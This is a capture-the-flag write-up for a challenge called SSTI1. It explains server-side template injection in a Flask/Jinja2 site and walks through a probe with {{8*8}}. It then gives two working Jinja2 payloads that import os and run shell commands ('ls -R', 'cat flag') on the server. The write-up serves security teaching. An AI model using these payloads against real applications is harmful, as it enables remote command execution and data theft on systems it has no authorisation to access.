# SSTI1

## Description
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.

I heard templating is a cool and modular way to build web apps! Check out my website here!

## About the Challenge

Hint Given: Server Side Template Injection.

**Server Side Template Injection**  is when a threat actor exploits a template's native syntax and inject malicious payloadas into template. Compromised template is then executed server side. Attackers use the server-side template injection technique to directly insert user input into templates, allowing them to  introduce arbitrary directives that alter the template's engine. 

Upon opening the website in a new tab, I am greeted wiith a page that allows me to 'announce whatever you want" in the textbox as shown below:

## How to Solve?

Given the hint, it can be inferred that the vulnerability lies in lack of proper user input sanitisation, which allow attackers to input malicious scripts.

Firstly, lets test this theory by inputting {{8*8}} in the textbox, a common template expression for Jinja2 in Python's Flask.

After pressing okay, the website processes the input and ouputs **64**

Hence, this confirms that server operates on Jinja2, and this allows me to proceed with next steps.

Using a different expression, we can obtain more information on where the flag is. Expression is shown below:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

This list out all working directories and upon running this expression, following result is shown:

By modifying the expression to obtain the flag:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

WE ARE ABLE TO OBTAIN THE FLAG!
